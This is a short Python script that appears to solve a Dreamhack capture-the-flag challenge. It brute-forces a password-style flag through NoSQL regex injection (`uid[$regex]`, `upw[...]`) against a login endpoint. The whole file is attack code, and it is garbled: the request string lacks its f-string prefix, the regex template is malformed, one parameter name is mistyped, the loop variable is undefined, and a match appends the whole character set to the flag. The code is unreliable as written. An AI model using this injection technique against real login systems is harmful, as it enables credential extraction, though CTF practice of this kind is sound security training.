import requests, string

HOST = "http://host3.dreamhack.games:9560/"
GET_FLAG = string.digits + string.ascii_letters
flag=""

while True:
        response = requests.get("{HOST}/login?uid[$regex]=ad.in&upw[&regex]=D.{{flag}{ch}")
        if response.text=="admin":
            flag += GET_FLAG
            break
print('DH{'+flag+'}')
